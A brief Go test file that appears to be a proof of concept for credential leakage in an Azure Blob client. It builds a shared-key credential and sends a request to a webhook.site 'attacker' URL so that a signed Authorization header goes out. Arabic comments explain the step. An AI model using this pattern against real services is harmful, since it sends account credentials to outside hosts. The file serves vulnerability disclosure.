package azblob

import (
	"context"
	"testing"
)

func TestImpact_CredentialLeakage(t *testing.T) {
	attackerURL := "https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835"
	cred, _ := NewSharedKeyCredential("victim_account", "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg==")
	
	// إنشاء العميل
	client, _ := NewClientWithSharedKeyCredential(attackerURL, cred, nil)

	// محاولة جلب الخصائص (هذه تجبر الـ Pipeline على توليد الـ Authorization Header)
	_, _ = client.GetProperties(context.Background(), nil)
}
